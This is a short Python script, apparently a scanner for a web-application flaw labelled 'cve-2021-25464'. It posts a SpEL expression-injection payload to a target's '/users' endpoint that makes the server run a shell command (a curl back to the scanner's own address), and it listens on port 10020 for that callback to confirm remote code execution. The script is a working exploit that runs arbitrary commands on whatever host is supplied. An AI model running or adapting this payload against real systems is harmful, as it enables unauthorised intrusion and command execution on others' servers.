#encoding:utf-8
try:
    import requests,os,sys,logging,socket,threading
    logging.basicConfig(level=logging.INFO,format="%(message)s")
except Exception as e:
    logging.info("[*] {}".format(e))
    os._exit(6)


def get_my_ip(ip,port):
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((ip,int(port)))
        my_ip = s.getsockname()
        s.close()
        return(my_ip[0])
    except Exception as e:
        logging.info("[*] timeout")
        os._exit(4)
def listen(ip):
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.bind(("0.0.0.0",10020))
        s.settimeout=10
        s.listen(1)
        while True:
            sock,addr = s.accept()
            if sock :
                user =  sock.recv(4096).strip()
                logging.info("[+] {} find cve-2021-25464 ".format(ip))
                os._exit(1)
    except Exception as e:
        logging.info("[-] {} do not found cve-2021-25464".format(ip))
        os._exit(2)


def check(ip,port,my_ip):
    target = "http://" + ip + ":" + port
    payload = "/users"                                   #填写payload
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Content-Type': 'application/x-www-form-urlencoded'
    }                                                               #填写header头
    data = 'username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("curl {}:10020")]'.format(my_ip)                                        
    try:
        req = requests.post(url=target+payload,headers=header,data=data,timeout=3)
    except Exception as e:
        logging.info("[*] {}".format(e))
        os._exit(4)


def main(ip,port):
    my_ip = get_my_ip(ip,port)
    listening = threading.Thread(target=listen,args=(ip,))
    listening.start()

    check(ip,port,my_ip)


if __name__== "__main__":
    ip = sys.argv[1]
    port = sys.argv[2]
    main(ip,port)